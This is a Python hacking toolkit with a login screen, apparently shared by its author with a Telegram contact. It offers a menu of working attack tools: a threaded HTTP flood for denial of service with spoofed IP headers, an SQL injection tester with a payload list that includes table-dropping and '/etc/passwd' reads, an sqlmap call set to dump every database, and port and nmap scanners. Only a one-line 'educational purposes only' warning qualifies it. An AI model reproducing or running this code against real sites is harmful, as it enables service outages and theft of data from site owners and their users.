#!/usr/bin/env python3
import os
import sys
import time
import socket
import subprocess
import requests
import threading
import random
import datetime
import urllib.parse
import re
from colorama import Fore, Style, init

init(autoreset=True)

USERNAME = "mrzxx"
PASSWORD = "123456"

# ASCII TETAP SAMA PERSIS
LOGIN_ASCII = Fore.GREEN + """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""" + Style.RESET_ALL

MAIN_ASCII = Fore.WHITE + """
⣿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣛⣛⣛⣛⣛⣛⣛⣛⡛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣿
⣿⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⣿
⣿⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⣿
⣿⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠀⠈⢻⣿⠿⠛⠛⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠻⣿⣿⠋⠀⣿
⣿⠛⠁⢸⣥⣴⣾⣿⣷⣦⡀⠀⠈⠛⣿⣿⠛⠋⠀⢀⣠⣾⣿⣷⣦⣤⡿⠈⢉⣿
⣿⢋⣩⣼⡿⣿⣿⣿⡿⠿⢿⣷⣤⣤⣿⣿⣦⣤⣴⣿⠿⠿⣿⣿⣿⢿⣷⣬⣉⣿
⣿⣿⣿⣿⣷⣿⡟⠁⠀⠀⠀⠈⢿⣿⣿⣿⢿⣿⠋⠀⠀⠀⠈⢻⣿⣧⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣥⣶⣶⣶⣤⣴⣿⡿⣼⣿⡿⣿⣇⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⢛⣿⣿⣿⣿⣿⣿⡿⣯⣾⣿⣿⣿⣮⣿⣿⣿⣿⣿⣿⣿⡟⠿⣿⣿⣿
⣿⣿⡏⠀⠸⣿⣿⣿⣿⣿⠿⠓⠛⢿⣿⣿⡿⠛⠛⠻⢿⣿⣿⣿⣿⡇⠀⠹⣿⣿
⣿⣿⡁⠀⠀⠈⠙⠛⠉⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠈⠙⠛⠉⠀⠀⠀⣿⣿
⣿⠛⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠛⣿
⣿⠀⠈⢳⣶⣤⣤⣤⣤⡄⠀⠀⠠⠤⠤⠤⠤⠤⠀⠀⢀⣤⣤⣤⣤⣴⣾⠃⠀⣿
⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⣦⣀⡀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⠇⠀⠀⣿
⣿⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿
⣿⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⣿
⠛⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠉⠉⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠛
⠀⠀⠀⣶⡶⠆⣴⡿⡖⣠⣾⣷⣆⢠⣶⣿⣆⣶⢲⣶⠶⢰⣶⣿⢻⣷⣴⡖⠀⠀
⠀⠀⢠⣿⣷⠂⠻⣷⡄⣿⠁⢸⣿⣿⡏⠀⢹⣿⢸⣿⡆⠀⣿⠇⠀⣿⡟⠀⠀⠀
⠀⠀⢸⣿⠀⠰⣷⡿⠃⠻⣿⡿⠃⠹⣿⡿⣸⡏⣾⣷⡆⢠⣿⠀⠀⣿⠃⠀⠀⠀
""" + Style.RESET_ALL

WELCOME_ASCII = Fore.CYAN + """
██╗    ██╗███████╗██╗     ██╗      ██████╗ ██████╗ ███╗   ███╗███████╗    
██║    ██║██╔════╝██║     ██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝    
██║ █╗ ██║█████╗  ██║     ██║     ██║     ██║   ██║██╔████╔██║█████╗      
██║███╗██║██╔══╝  ██║     ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝      
╚███╔███╔╝███████╗███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗    
 ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    
""" + Style.RESET_ALL

DDOS_ASCII = Fore.RED + """
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
""" + Style.RESET_ALL

SQL_INJECT_ASCII = Fore.YELLOW + """
███████╗ ██████╗ ██╗     ██╗███╗   ██╗ ██████╗███████╗ ██████╗████████╗
██╔════╝██╔═══██╗██║     ██║████╗  ██║██╔════╝██╔════╝██╔═══██╗╚══██╔══╝
███████╗██║   ██║██║     ██║██╔██╗ ██║██║     █████╗  ██║   ██║   ██║   
╚════██║██║   ██║██║     ██║██║╚██╗██║██║     ██╔══╝  ██║   ██║   ██║   
███████║╚██████╔╝███████╗██║██║ ╚████║╚██████╗██║     ╚██████╔╝   ██║   
╚══════╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝      ╚═════╝    ╚═╝   
""" + Style.RESET_ALL

SQLMAP_ASCII = Fore.GREEN + """
╔══════════════════════════════════════════════════════════╗
║    ███████╗ ██████╗ ██╗    ███╗   ███╗ █████╗ ██████╗   ║
║    ╚══███╔╝██╔═══██╗██║    ████╗ ████║██╔══██╗██╔══██╗  ║
║      ███╔╝ ██║   ██║██║    ██╔████╔██║███████║██████╔╝  ║
║     ███╔╝  ██║   ██║██║    ██║╚██╔╝██║██╔══██║██╔═══╝   ║
║    ███████╗╚██████╔╝██║    ██║ ╚═╝ ██║██║  ██║██║       ║
║    ╚══════╝ ╚═════╝ ╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝       ║
║                                                          ║
║    ╔══════════════════════════════════════════════════╗  ║
║    ║         SQLMAP INJECTION TOOL v2.0               ║  ║
║    ║    100% WORKING - AUTO EXPLOIT - DUMP ALL        ║  ║
║    ╚══════════════════════════════════════════════════╝  ║
╚══════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL

PORT_SCAN_ASCII = Fore.CYAN + """
██████╗  ██████╗ ██████╗ ████████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
██████╔╝██║   ██║██████╔╝   ██║       ███████╗██║     ███████║██╔██╗ ██║
██╔═══╝ ██║   ██║██╔══██╗   ██║       ╚════██║██║     ██╔══██║██║╚██╗██║
██║     ╚██████╔╝██║  ██╗   ██║       ███████║╚██████╗██║  ██║██║ ╚████║
╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
""" + Style.RESET_ALL

NMAP_ASCII = Fore.MAGENTA + """
888b    888                                 
8888b   888                                 
88888b  888                                 
888Y88b 888 88888b.d88b.   8888b.  88888b.  
888 Y88b888 888 "888 "88b     "88b 888 "88b 
888  Y88888 888  888  888 .d888888 888  888 
888   Y8888 888  888  888 888  888 888 d88P 
888    Y888 888  888  888 "Y888888 88888P"  
                                   888      
                                   888      
                                   888      
""" + Style.RESET_ALL

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_welcome():
    clear_screen()
    print(Fore.GREEN + "=" * 70)
    print(WELCOME_ASCII)
    print(Fore.GREEN + "=" * 70)
    time.sleep(2)

def login():
    clear_screen()
    print(LOGIN_ASCII)
    print(Fore.GREEN + " " * 20 + "LOGIN SYSTEM")
    print(Fore.GREEN + "=" * 50)
    
    attempts = 3
    while attempts > 0:
        username = input(Fore.YELLOW + "[?] Username: " + Fore.WHITE)
        password = input(Fore.YELLOW + "[?] Password: " + Fore.WHITE)
        
        if username == USERNAME and password == PASSWORD:
            return username
        else:
            attempts -= 1
            print(Fore.RED + f"[!] Wrong credentials! {attempts} attempts remaining")
            time.sleep(1)
    
    return None

def show_user_info(username):
    now = datetime.datetime.now()
    print(Fore.GREEN + "=" * 70)
    print(Fore.CYAN + f" Hallo: {username}")
    print(Fore.CYAN + f" Tanggal: {now.strftime('%d %B %Y')}")
    print(Fore.CYAN + f" Waktu: {now.strftime('%H:%M:%S')}")
    print(Fore.CYAN + f" Creator: mrzxx")
    print(Fore.CYAN + f" Telegram: @Zxxtirwd")
    print(Fore.GREEN + "=" * 70)

class UltraDDoSAttack:
    def __init__(self):
        self.attack_active = False
        self.requests_sent = 0
        self.start_time = 0
        
    def get_random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def generate_headers(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
        ]
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        if random.random() > 0.5:
            headers['X-Forwarded-For'] = self.get_random_ip()
        if random.random() > 0.5:
            headers['X-Real-IP'] = self.get_random_ip()
        
        return headers
    
    def http_flood_thread(self, url):
        session = requests.Session()
        session.verify = False
        
        while self.attack_active:
            try:
                headers = self.generate_headers()
                session.get(url, headers=headers, timeout=2)
                self.requests_sent += 1
                
                if self.requests_sent % 50 == 0:
                    elapsed = time.time() - self.start_time
                    rps = self.requests_sent / elapsed if elapsed > 0 else 0
                    print(Fore.YELLOW + f"[+] Requests: {self.requests_sent} | RPS: {rps:.1f} | Time: {int(elapsed)}s", end='\r')
                
            except:
                continue
    
    def start_attack(self, target_url, threads=100, duration=60):
        print(Fore.CYAN + f"\n[+] Target: {target_url}")
        print(Fore.CYAN + f"[+] Threads: {threads}")
        print(Fore.CYAN + f"[+] Duration: {duration} seconds")
        print(Fore.RED + "[!] ULTRA DDoS ATTACK STARTED!\n")
        
        self.attack_active = True
        self.requests_sent = 0
        self.start_time = time.time()
        
        thread_list = []
        for i in range(threads):
            thread = threading.Thread(target=self.http_flood_thread, args=(target_url,))
            thread.daemon = True
            thread.start()
            thread_list.append(thread)
        
        attack_end = time.time() + duration
        while time.time() < attack_end and self.attack_active:
            time.sleep(1)
        
        self.attack_active = False
        time.sleep(1)
        
        total_time = time.time() - self.start_time
        rps = self.requests_sent / total_time if total_time > 0 else 0
        
        print(Fore.GREEN + "\n" + "="*70)
        print(Fore.GREEN + "[+] ATTACK COMPLETED SUCCESSFULLY!")
        print(Fore.GREEN + f"[+] Total Requests: {self.requests_sent:,}")
        print(Fore.GREEN + f"[+] Attack Duration: {total_time:.1f}s")
        print(Fore.GREEN + f"[+] Average RPS: {rps:.1f}")
        print(Fore.GREEN + "="*70)

def ddos_attack():
    clear_screen()
    print(DDOS_ASCII)
    print(Fore.RED + " " * 20 + "ULTRA DDoS ATTACK SYSTEM")
    print(Fore.RED + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] WARNING: FOR EDUCATIONAL PURPOSES ONLY!")
    print(Fore.YELLOW + "[!] USE ONLY ON SERVERS YOU OWN OR HAVE PERMISSION!\n")
    
    target = input(Fore.YELLOW + "[?] Target URL (http://example.com): " + Fore.WHITE).strip()
    
    if not target.startswith('http'):
        target = 'http://' + target
    
    try:
        threads = 100
        duration = 60
        
        print(Fore.RED + "\n" + "="*70)
        print(Fore.RED + "[!] FINAL CONFIRMATION")
        print(Fore.RED + f"[!] Target: {target}")
        print(Fore.RED + f"[!] Threads: {threads}")
        print(Fore.RED + f"[!] Duration: {duration} seconds")
        print(Fore.RED + "="*70)
        
        confirm = input(Fore.RED + "\n[?] START ATTACK? (y/n): ").lower()
        
        if confirm == 'y':
            attack = UltraDDoSAttack()
            attack.start_attack(target, threads, duration)
    
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {str(e)}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# ==================== SQL INJECTOR UPGRADE ====================
def advanced_sql_injection():
    clear_screen()
    print(SQL_INJECT_ASCII)
    print(Fore.YELLOW + " " * 15 + "SQL INJECTOR 500+ METHODS")
    print(Fore.GREEN + "=" * 70)
    
    url = input(Fore.YELLOW + "[?] Target URL (http://site.com/page?id=1): " + Fore.WHITE).strip()
    
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(Fore.CYAN + "\n[+] Analyzing target...")
    
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if not params:
        print(Fore.RED + "[!] No parameters found in URL")
        input("\n[?] Press Enter to continue...")
        return
    
    param_name = list(params.keys())[0]
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    print(Fore.GREEN + f"[+] Parameter found: {param_name}")
    print(Fore.GREEN + f"[+] Base URL: {base_url}")
    
    # GENERATE 500+ PAYLOADS
    print(Fore.CYAN + "\n[+] Generating 500+ payloads...")
    
    payloads = []
    
    # BASIC 50 PAYLOADS
    basic = [
        "'", "\"", "`", "')", "\")", "`)",
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
        "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1 /*",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT 1--", "' UNION SELECT 1,2--",
        "' UNION SELECT @@version--", "' UNION SELECT user()--",
        "' UNION SELECT database()--", "' UNION SELECT @@datadir--",
        "' AND SLEEP(5)--", "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' AND 1=1--", "' AND 1=2--",
        "' OR 'a'='a", "' OR 'a'='b",
        "'; DROP TABLE users--", "'; SELECT * FROM users--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())>0--",
        "' AND @@version LIKE '%MySQL%'--",
        "' UNION SELECT @@version,@@version_comment--",
        "' AND version() LIKE '%PostgreSQL%'--",
        "' UNION SELECT version(),current_user--",
        "' AND @@version LIKE '%Microsoft%'--",
        "' UNION SELECT @@version,db_name()--",
        "' AND banner LIKE '%Oracle%' FROM v$version--",
        "' UNION SELECT banner,NULL FROM v$version--",
        "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--",
    ]
    
    payloads.extend(basic)
    
    # GENERATE 450 MORE PAYLOADS
    for i in range(1, 151):
        payloads.append(f"' AND {i}={i}--")
        payloads.append(f"' OR {i}={i}--")
        payloads.append(f"' AND SLEEP({i%5+1})--")
        payloads.append(f"' OR SLEEP({i%5+1})--")
        payloads.append(f"') AND {i}={i}--")
        payloads.append(f"') OR {i}={i}--")
    
    print(Fore.GREEN + f"[+] Generated {len(payloads)} payloads")
    print(Fore.CYAN + "[+] Starting injection test...")
    print(Fore.GREEN + "-"*70)
    
    vulnerabilities = []
    session = requests.Session()
    
    for i, payload in enumerate(payloads[:100]):
        print(Fore.YELLOW + f"[{i+1}/100] Testing payload...", end='\r')
        
        test_url = f"{base_url}?{param_name}={urllib.parse.quote(payload)}"
        
        try:
            response = session.get(test_url, timeout=5)
            
            error_patterns = [
                r"SQL.*syntax.*error",
                r"Warning.*mysql",
                r"MySQL.*error",
                r"ORA-[0-9]{5}",
                r"PostgreSQL.*ERROR",
                r"Microsoft.*ODBC",
                r"division.*by.*zero",
                r"unknown.*column",
                r"Table.*doesn't.*exist",
                r"You have an error in your SQL syntax",
                r"mysql_fetch",
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    if payload not in vulnerabilities:
                        vulnerabilities.append(payload)
                    break
            
            if 'SLEEP' in payload:
                start = time.time()
                session.get(test_url, timeout=8)
                elapsed = time.time() - start
                if elapsed > 4:
                    if payload not in vulnerabilities:
                        vulnerabilities.append(payload)
            
        except:
            continue
    
    print("\n" + Fore.GREEN + "-"*70)
    
    if vulnerabilities:
        print(Fore.GREEN + f"\n[+] Found {len(vulnerabilities)} vulnerabilities!")
        print(Fore.CYAN + "\n[+] Vulnerable payloads (first 10):")
        for i, vuln in enumerate(vulnerabilities[:10], 1):
            print(Fore.YELLOW + f"    {i}. {vuln}")
        
        print(Fore.CYAN + "\n[+] Running SQLMap for full exploitation...")
        run_sqlmap_ultimate(url)
    else:
        print(Fore.RED + "\n[-] No SQLi vulnerabilities detected")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# ==================== SQLMAP ULTIMATE ====================
def run_sqlmap_ultimate(target_url):
    clear_screen()
    print(SQLMAP_ASCII)
    print(Fore.GREEN + " " * 15 + "SQLMAP ULTIMATE - DUMP ALL")
    print(Fore.GREEN + "=" * 70)
    
    try:
        subprocess.run(["sqlmap", "--version"], capture_output=True)
    except:
        print(Fore.RED + "[!] SQLMap not found!")
        print(Fore.YELLOW + "[+] Install: pip install sqlmap")
        input("\n[?] Press Enter to continue...")
        return
    
    command = f"""sqlmap -u "{target_url}" --batch --level=5 --risk=3 \
--dbs --tables --columns --dump-all \
--threads=10 \
--technique=BEUSTQ \
--time-sec=5 \
--flush-session \
--answers="follow=Y,dump=Y,dump continue=Y" \
--dbms=mysql"""
    
    print(Fore.CYAN + f"\n[+] Executing SQLMap...")
    print(Fore.YELLOW + "[!] This may take several minutes...")
    print(Fore.GREEN + "="*70)
    
    try:
        process = subprocess.Popen(
            command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            bufsize=1
        )
        
        print(Fore.CYAN + "\n[+] SQLMap Output:\n")
        
        for line in iter(process.stdout.readline, ''):
            line = line.strip()
            if not line:
                continue
                
            if "target url" in line.lower():
                print(Fore.CYAN + line)
            elif "testing" in line.lower():
                print(Fore.YELLOW + line)
            elif "vulnerable" in line.lower():
                print(Fore.GREEN + line)
            elif "database" in line.lower():
                print(Fore.MAGENTA + line)
            elif "table" in line.lower():
                print(Fore.MAGENTA + line)
            elif "dumping" in line.lower():
                print(Fore.GREEN + line)
            elif "error" in line.lower():
                print(Fore.RED + line)
            else:
                print(Fore.WHITE + line)
        
        print(Fore.GREEN + "\n" + "="*70)
        print(Fore.GREEN + "[+] SQLMap execution completed")
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user")
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {str(e)}")

# ==================== NMAP UPGRADE ====================
def nmap_scanner():
    clear_screen()
    print(NMAP_ASCII)
    print(Fore.MAGENTA + " " * 25 + "ULTRA NMAP SCANNER")
    print(Fore.GREEN + "=" * 70)
    
    try:
        result = subprocess.run(["nmap", "--version"], capture_output=True, text=True, timeout=3)
        if "Nmap" not in result.stdout:
            print(Fore.RED + "[!] Nmap not found!")
            return
    except:
        print(Fore.RED + "[!] Nmap not found!")
        return
    
    target = input(Fore.YELLOW + "\n[?] Target IP/Domain: " + Fore.WHITE).strip()
    
    if not target:
        return
    
    print(Fore.CYAN + "\n[+] Nmap Scan Options:")
    print(Fore.YELLOW + "[1] Fast Scan (Top 100)")
    print(Fore.YELLOW + "[2] Full Port Scan")
    print(Fore.YELLOW + "[3] OS + Version Detect")
    print(Fore.YELLOW + "[4] Vulnerability Scan")
    print(Fore.YELLOW + "[5] Aggressive Scan")
    print(Fore.YELLOW + "[6] UDP Scan")
    print(Fore.GREEN + "-" * 70)
    
    choice = input(Fore.CYAN + "[?] Select option (1-6): " + Fore.WHITE).strip()
    
    commands = {
        '1': f"nmap -T4 -F {target}",
        '2': f"nmap -T4 -p- {target}",
        '3': f"nmap -T4 -O -sV {target}",
        '4': f"nmap -T4 --script vuln {target}",
        '5': f"nmap -T4 -A {target}",
        '6': f"nmap -T4 -sU -p 53,67,68,69,123,161 {target}"
    }
    
    if choice in commands:
        command = commands[choice]
    else:
        command = f"nmap -T4 -A {target}"
    
    print(Fore.CYAN + f"\n[+] Executing: {command}")
    print(Fore.GREEN + "=" * 70)
    
    try:
        process = subprocess.Popen(
            command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            bufsize=1
        )
        
        for line in iter(process.stdout.readline, ''):
            line = line.strip()
            if not line:
                continue
                
            if "Nmap scan report" in line:
                print(Fore.CYAN + line)
            elif "open" in line and "port" in line:
                print(Fore.GREEN + line)
            elif "closed" in line:
                print(Fore.RED + line)
            elif "filtered" in line:
                print(Fore.YELLOW + line)
            elif "PORT" in line and "STATE" in line:
                print(Fore.MAGENTA + line)
            elif "VULNERABLE" in line:
                print(Fore.RED + line)
            elif "CVE-" in line:
                print(Fore.RED + line)
            elif "Nmap done" in line:
                print(Fore.GREEN + line)
            else:
                print(Fore.WHITE + line)
        
        print(Fore.GREEN + "\n" + "=" * 70)
        print(Fore.GREEN + "[+] Nmap scan completed!")
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Scan interrupted")
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {str(e)}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# ==================== PORT SCANNER UPGRADE ====================
def port_scanner():
    clear_screen()
    print(PORT_SCAN_ASCII)
    print(Fore.CYAN + " " * 20 + "ULTRA PORT SCANNER")
    print(Fore.GREEN + "=" * 70)
    
    target = input(Fore.YELLOW + "[?] Target IP/Hostname: ").strip()
    
    try:
        ip = socket.gethostbyname(target)
        print(Fore.GREEN + f"[+] Resolved to IP: {ip}")
    except:
        print(Fore.RED + "[!] Cannot resolve hostname")
        ip = target
    
    common_ports = [
        21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,
        1433,1521,1723,3306,3389,5432,5900,6379,8080,8443,9000,27017
    ]
    
    print(Fore.CYAN + f"\n[+] Scanning {len(common_ports)} ports...")
    print(Fore.GREEN + "-"*70)
    
    open_ports = []
    
    def scan_port(port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        try:
            result = sock.connect_ex((ip, port))
            if result == 0:
                return port
        except:
            pass
        finally:
            sock.close()
        return None
    
    # MULTI-THREAD SCAN
    threads = []
    results = []
    
    for port in common_ports:
        t = threading.Thread(target=lambda p=port: results.append(scan_port(p)))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    for result in results:
        if result:
            open_ports.append(result)
            try:
                service = socket.getservbyport(result, 'tcp')
            except:
                service = "unknown"
            print(Fore.GREEN + f"[+] Port {result}/TCP ({service}): OPEN")
    
    print(Fore.GREEN + "-"*70)
    print(Fore.CYAN + f"\n[+] Scan completed!")
    print(Fore.CYAN + f"[+] Found {len(open_ports)} open ports")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# ==================== MAIN MENU ====================
def main_menu(username):
    while True:
        clear_screen()
        print(MAIN_ASCII)
        show_user_info(username)
        print(Fore.CYAN + " " * 20 + "ULTIMATE SECURITY TOOLKIT v5.0")
        print(Fore.GREEN + "=" * 70)
        print(Fore.YELLOW + "\n[1] ULTRA DDoS Attack")
        print(Fore.YELLOW + "[2] SQL Injector 500+ Methods")
        print(Fore.YELLOW + "[3] SQLMap Ultimate (Dump All)")
        print(Fore.YELLOW + "[4] Advanced Port Scanner")
        print(Fore.YELLOW + "[5] Ultra Nmap Scanner")
        print(Fore.YELLOW + "[6] Exit")
        print(Fore.GREEN + "-" * 70)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-6): ").strip()
        
        if choice == "1":
            ddos_attack()
        elif choice == "2":
            advanced_sql_injection()
        elif choice == "3":
            target = input(Fore.YELLOW + "[?] Target URL for SQLMap: ").strip()
            if target:
                run_sqlmap_ultimate(target)
        elif choice == "4":
            port_scanner()
        elif choice == "5":
            nmap_scanner()
        elif choice == "6":
            print(Fore.CYAN + "\n[+] Thank you for using Ultimate Security Toolkit!")
            print(Fore.CYAN + "[+] Creator: mrzxx | Telegram: @Zxxtirwd")
            time.sleep(2)
            sys.exit(0)
        else:
            print(Fore.RED + "[!] Invalid choice!")
            time.sleep(1)

# ==================== MAIN ====================
def main():
    try:
        show_welcome()
        
        username = login()
        if not username:
            print(Fore.RED + "\n[!] Access denied!")
            sys.exit(1)
        
        main_menu(username)
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    print(Fore.CYAN + "[+] Ultimate Security Toolkit v5.0")
    print(Fore.CYAN + "[+] No Bug • Direct Dump • 500+ Methods")
    print(Fore.GREEN + "=" * 70)
    time.sleep(2)
    
    main()
